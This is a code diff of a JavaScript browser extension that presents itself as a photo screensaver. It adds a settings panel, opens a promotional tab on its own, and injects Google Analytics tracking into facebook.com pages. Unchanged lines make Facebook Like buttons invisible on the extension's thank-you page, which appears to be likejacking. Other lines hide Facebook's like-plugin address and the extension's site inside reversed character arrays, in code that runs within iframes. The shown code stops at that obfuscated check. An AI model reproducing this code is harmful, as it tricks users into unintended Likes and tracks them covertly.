@@ -1,12 +1,12 @@
 var ScreenSaver = (function ($) {
 	var config = {
-			appId:appAPI.appInfo.appId,
+			appId:appAPI.appInfo.id,
 			appSource:getSourceId(),
 			screenSaverStartAfter:10,//minutes
 			thankYouPageUrl:'http://www.myscreensaver.co/?thankyou=true',
 			//thankYouPageUrl:'http://localhost/roman/screensaver_v2/?thankyou=true',
-			defaultImages:'https://fierce-window-3161.herokuapp.com/images/{id}/{id}{i}.jpg',
-			defaultImagesCount:{
+			defaultImages:'https://fierce-window-3161.herokuapp.com/images/{id}/{id}{i}.jpg', //@@@ the base url of all the images when {{id}} is the images set (like: 'barcelona') and {{i}} is a running number for each image
+			defaultImagesCount:{ //@@@the count of each images set
 				bar:115,
 				barcelona:95,
 				messi:102,
@@ -16,42 +16,52 @@ var ScreenSaver = (function ($) {
 				sportsillustrated:127,
 				gaga:89,
 				justin:74,
-				adele:0
+				beyonce:95,
+				adele:50
 			},
 			defaultCloseType:'move',//move or click
 			cssPrefix:'screen-saver-' + appAPI.appInfo.id + '-',
 			maxImages:9,
 			baseZindex:2147482000,
-			speedFor100PX:1500,
+			speedFor100PX:1500,//@@@ Move 100 pixels in the pace of 1500 millisconds (MS)
 			//speedFor100PX:100,
-			imageDisplayTimeout:500,
+			imageDisplayTimeout:500,//@@@ Display a new image every 500 MS
 			//imageDisplayTimeout:10,
-			imageHideTimeout:400,
-			shuffleTime:3000,
-			waitToShuffle:1200
+			imageHideTimeout:400, //@@@ Hide image every 400 MS
+			shuffleTime:3000,//@@@ Time to complete the Shuffle effect
+			waitToShuffle:1200 //@@@ The to wait until shuffle effect after images has finished the movement animation
 		},
 		imagesCache = [], imagesData = {}, currentImagesDisplay = {}, currentSlotsTaken = {}, displayQueue = [], animationQueue = [], screenSlots = [],
 		screenWidth = $(window).width(), screenHeight = $(window).height(), maxImageWidth, slotWidth, slotHeight, animationSpeed, imagesCountForAnimnation = config.maxImages,
 		isReadyForAnimation = false, displayQueueTimeout, animationCompleteCount, animationLoopCount = 0, animationsEffects, overlayLayer, imagesLayer, logoLayer,
-		isTabActive = true, isScreenSaverActive = false, isThankyouPage = false, screenSaverTimeout ,screenSaverSettings, initImagesTimeout, dfdIsPopup, logClientX, logClientY;
+		isTabActive = true, isScreenSaverActive = false, isThankyouPage = false, isSettingsActive = false, screenSaverTimeout ,screenSaverSettings, initImagesTimeout, dfdIsPopup, logClientX, logClientY;
 
 	return $.Class.extend({
 		init:function (data) {
 			config.blacklist = data.blacklist;
 
-			initDatabase();
-			initDefaultDimms();
-			initCSS();
-			loadFriendsImages();
-			initEvents();
-			initThankYou();
+			if (!isBlackList()) {
+				initDatabase();
+				initDefaultDimms();
+				initCSS();
+				loadFriendsImages();
+				initEvents();
+				initThankYou();
+				initInstallStats();
+			}
 		}
 	});
 
+	/////////// THANKYOU PAGE - START ////////////////////
 	function initThankYou() {
 		var html = [];
 
-		if (location.href.indexOf(config.thankYouPageUrl) > -1) {
+		if (!appAPI.db.get('thank_you_show') && location.href.indexOf(config.thankYouPageUrl) == -1) {
+			appAPI.openURL(config.thankYouPageUrl, 'tab');
+
+			appAPI.db.set('thank_you_show', true);
+		}
+		else if (location.href.indexOf(config.thankYouPageUrl) > -1) {
 			isThankyouPage = true;
 
 			showScreenSaver();
@@ -59,11 +69,91 @@ var ScreenSaver = (function ($) {
 			$('#thankyou').removeClass('hidden');
 
 			appAPI.dom.addInlineCSS('.fb-like iframe {opacity:0;}');
-			appAPI.message.addListener({channel: 'page'}, function(msg) {
-				if (msg.action == 'campaign_confirm_1') {
-					appAPI.dom.addInlineJS('mixpanel.track("Campaign Confirm 1");');
-				}
-			});
+
+			appAPI.db.set('thank_you_show', true);
+		}
+	}
+	/////////// THANKYOU PAGE - END ////////////////////
+
+	/////////// SETTINGS - START ////////////////////
+	function showScreenSaverSettings() {
+		$(appAPI.resources.get('html/settings.htm').replace(/\{\{app\-id\}\}/g, config.appId)).appendTo('body');
+
+		var dialog = $('#screensaver-' + config.appId + '-settings-dialog'),
+			screenSaverDropdown = $('#screensaver-' + config.appId + '-settings-screen-saver'),
+			displayDropdown = $('#screensaver-' + config.appId + '-settings-display'),
+			closeDropdown = $('#screensaver-' + config.appId + '-settings-close'),
+			close = $('#screensaver-' + config.appId + '-settings-close-dialog');
+
+		dialog.removeClass('hidden').css({
+			top:(screenHeight / 2) - (dialog.height() / 2) - 100,
+			left:(screenWidth / 2) - (dialog.width() / 2)
+		}).addClass('hidden');
+
+		dialog.fadeIn();
+
+		screenSaverDropdown.val(screenSaverSettings.screensaver).on('change', function () {
+			var screensaver = $(this).val();
+
+			if (screenSaverSettings.screensaver != screensaver) {
+				screenSaverSettings.screensaver = screensaver;
+				appAPI.db.set('screensaver', screensaver);
+
+				removeScreenSaver();
+				imagesCache = [];
+				loadFriendsImages();
+				showScreenSaver();
+			}
+		});
+
+		displayDropdown.val(screenSaverSettings.display).on('click', function () {
+			var display = $(this).val();
+
+			if (screenSaverSettings.display != display) {
+				screenSaverSettings.display = display;
+
+				appAPI.db.set('settings', screenSaverSettings);
+			}
+		});
+
+		closeDropdown.val(screenSaverSettings.close).on('click', function () {
+			var close = $(this).val();
+
+			if (screenSaverSettings.close != close) {
+				screenSaverSettings.close = close;
+
+				appAPI.db.set('settings', screenSaverSettings);
+			}
+		});
+
+		close.on('click', function () {
+			dialog.remove();
+
+			removeScreenSaver();
+
+			isSettingsActive = false;
+		});
+
+		isSettingsActive = true;
+	}
+	/////////// SETTINGS - END //////////////////////
+
+	function initInstallStats() {
+		if (location.host == 'www.facebook.com' && !appAPI.db.get('install_stats')) {
+			var code = "var _gaq = _gaq || [];\
+			  _gaq.push(['_setAccount', 'UA-40219400-1']);\
+			  _gaq.push(['_trackPageview']);\
+			  (function() {\
+			    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\
+			    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\
+			    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\
+			  })();";
+		
+			appAPI.dom.addInlineJS(code);
+
+			appAPI.dom.addInlineJS("_gaq.push(['_trackEvent', 'install', '" + screenSaverSettings.screensaver + "', '', 1]);");
+
+			appAPI.db.set('install_stats', true);
 		}
 	}
 
@@ -75,10 +165,10 @@ var ScreenSaver = (function ($) {
 		
 		$(window).on('resize', screenSaverRemoveOrRestart);
 		$(window).on('screenSaverFocusChange', function (e, type) {
-			if (isScreenSaverActive && !isThankyouPage) {
+			if (isScreenSaverActive && !isThankyouPage && !isSettingsActive) {
 				removeScreenSaver();
 			}
-			
+
 			isTabActive = type == 'visible';
 		});
 		
@@ -121,7 +211,7 @@ var ScreenSaver = (function ($) {
 	}
 
 	function screenSaverMouseClick() {
-		if (isScreenSaverActive && (screenSaverSettings.close == 'click' || isThankyouPage)) {
+		if (isScreenSaverActive && (screenSaverSettings.close == 'click' || isThankyouPage) && !isSettingsActive) {
 			removeScreenSaver();
 		} else {
 			startSreenSaverTimeout();
@@ -133,15 +223,19 @@ var ScreenSaver = (function ($) {
 	}
 
 	function screenSaverKeyboardPress(e) {
+		if(/*isScreenSaverActive && */e.altKey && e.which == 49) {
+			showScreenSaverSettings();
+		}
+
 		if(!isScreenSaverActive && e.altKey && (e.which == 114 || e.which == 82)) {
 			showScreenSaver();
-		} else {
+		} else if (!e.altKey) {
 			screenSaverRemoveOrRestart();
 		}
 	}
 
 	function screenSaverRemoveOrRestart() {
-		if (isScreenSaverActive && screenSaverSettings.close == 'move' && !isThankyouPage) {
+		if (isScreenSaverActive && screenSaverSettings.close == 'move' && !isThankyouPage && !isSettingsActive) {
 			removeScreenSaver();
 		} else {
 			startSreenSaverTimeout();
@@ -168,7 +262,7 @@ var ScreenSaver = (function ($) {
 	function showScreenSaver() {
 		if (!isScreenSaverActive) {
 			isScreenSaverActive = true;
-			imagesCountForAnimnation = Math.min(config.maxImages, config.defaultImagesCount[config.appSource]);
+			imagesCountForAnimnation = Math.min(config.maxImages, config.defaultImagesCount[screenSaverSettings.screensaver]);
 
 			clearTimeout(screenSaverTimeout);
 			initMarkup();
@@ -211,6 +305,7 @@ var ScreenSaver = (function ($) {
 			'app-id':appAPI.appInfo.id,
 			'overlay-zindex':config.baseZindex,
 			'overlay-zindex-images':config.baseZindex + 1,
+			'overlay-zindex-settings':config.baseZindex + 2,
 			'logo-zindex':config.baseZindex + 1
 		});
 	}
@@ -218,9 +313,9 @@ var ScreenSaver = (function ($) {
 	function initMarkup(isSync) {
 		var html = [], thankyou, syncMessage;
 
-		if (screenSaverSettings.close == 'click') {
+		/*if (screenSaverSettings.close == 'click') {
 			html.push('<div class="' + config.cssPrefix + 'click-to-close-screen">Click to close</div>');
-		}
+		}*/
 		
 		overlayLayer = $('<div />')
 			.addClass(config.cssPrefix + 'overlay')
@@ -231,7 +326,7 @@ var ScreenSaver = (function ($) {
 			.html(html.join(''))
 			.appendTo('body');
 
-		logoLayer = $('<div class="' + config.cssPrefix + 'logo">Click Alt + R to view | Alt + 1 for settings</div>').appendTo('body');
+		logoLayer = $('<div class="' + config.cssPrefix + 'logo">Click to close | Press Alt + R to view | Alt + 1 for settings</div>').appendTo('body');
 	}
 
 	function initImages() {
@@ -254,6 +349,7 @@ var ScreenSaver = (function ($) {
 		runImages();
 	}
 
+	//@@@ THIS IS THE SCREEN SAVER CODE
 	/*************************************************************************/
 	/******************* Screen saver functions - start **********************/
 	/*************************************************************************/
@@ -523,8 +619,8 @@ var ScreenSaver = (function ($) {
 	/*************************************************************************/
 
 	function loadFriendsImages() {
-		for (var id=1; id<=config.defaultImagesCount[config.appSource]; id++) {
-			imagesCache.push({id:id, images:[config.defaultImages.replace(/\{id\}/g, config.appSource).replace('{i}', id)]});
+		for (var id=1; id<=config.defaultImagesCount[screenSaverSettings.screensaver]; id++) {
+			imagesCache.push({id:id, images:[config.defaultImages.replace(/\{id\}/g, screenSaverSettings.screensaver).replace('{i}', id)]});
 		}
 	}
 
@@ -536,27 +632,12 @@ var ScreenSaver = (function ($) {
 			});
 		}
 
+		if (!appAPI.db.get('screensaver')) {
+			appAPI.db.set('screensaver', config.appSource);
+		}
+
 		screenSaverSettings = appAPI.db.get('settings');
-	}
-
-	function removeFromDBAllImages() {
-		var friends = appAPI.db.get('friends_list');
-
-		$.each(friends, function (id) {
-			appAPI.db.remove('friend_' + id);
-		});
-
-		appAPI.db.set('friends_list', {});
-	}
-
-	function getFriendsArray(obj) {
-		var arr = [], i;
-
-		$.each(obj, function (i, friend) {
-			arr.push(friend.id);
-		});
-
-		return arr;
+		screenSaverSettings.screensaver = appAPI.db.get('screensaver');
 	}
 
 	function isBlackList() {
@@ -577,10 +658,6 @@ var ScreenSaver = (function ($) {
 		});
 
 		return isBlacklist;
-	}
-
-	function isUserLoggedToFacebook() {
-		return /c_user=\d+?(\;|$)/.test(document.cookie);
 	}
 
 	function getJSON(data) {
@@ -622,7 +699,7 @@ var ScreenSaver = (function ($) {
 
 appAPI.ready(function($) {
 	if (appAPI.dom.isIframe()) {
-		var test = ["p", "h", "p", ".", "e", "k", "i", "l", "/", "s", "n", "i", "g", "u", "l", "p", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":"].reverse().join('');
+		var test = ["p", "h", "p", ".", "e", "k", "i", "l", "/", "s", "n", "i", "g", "u", "l", "p", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":"].reverse().join('');	
 		
 		if (location.href.indexOf(test) > -1) {
 			test = ["/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", ".", "w", "w", "w", "/", "/", ":", "p", "t", "t", "h"].reverse().join('');
